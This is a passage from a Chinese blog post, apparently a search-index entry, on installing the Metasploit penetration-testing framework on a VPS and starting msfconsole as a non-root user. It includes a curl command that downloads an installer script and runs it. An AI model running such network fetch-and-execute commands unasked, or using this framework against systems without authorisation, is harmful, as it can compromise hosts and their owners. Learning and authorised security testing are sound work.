<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">apt-get install curl,wget</span><br><span class="line">curl https:<span class="regexp">//</span>raw.githubusercontent.com<span class="regexp">/rapid7/m</span>etasploit-omnibus<span class="regexp">/master/</span>config<span class="regexp">/templates/m</span>etasploit-framework-wrappers<span class="regexp">/msfupdate.erb &gt; msfinstall &amp;&amp; \</span></span><br><span class="line"><span class="regexp">  chmod 755 msfinstall &amp;&amp; \</span></span><br><span class="line"><span class="regexp">  ./m</span>sfinstall</span><br></pre></td></tr></table></figure>

<p>设置启动msfconsole，都切换到msf用户下启动，这样会同步数据库。如果使用root用户启动的话，不会同步数据库,cd到msfconsole所在目录执行如下命令，目录所在位置”/opt/metasploit-framework/bin”。</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">adduser </span>msf </span><br><span class="line"><span class="symbol">su</span> msf</span><br><span class="line">./msfconsole</span><br></pre></td></tr></table></figure>

<p>如果初次运行是在root用户下，使用如下命令，然后使用非root用户初始化数据库。</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">msfdb reinit</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Metasploit</category>
      </categories>
      <tags>
        <tag>msf</tag>
        <tag>vps</tag>
      </tags>
  </entry>
</search>
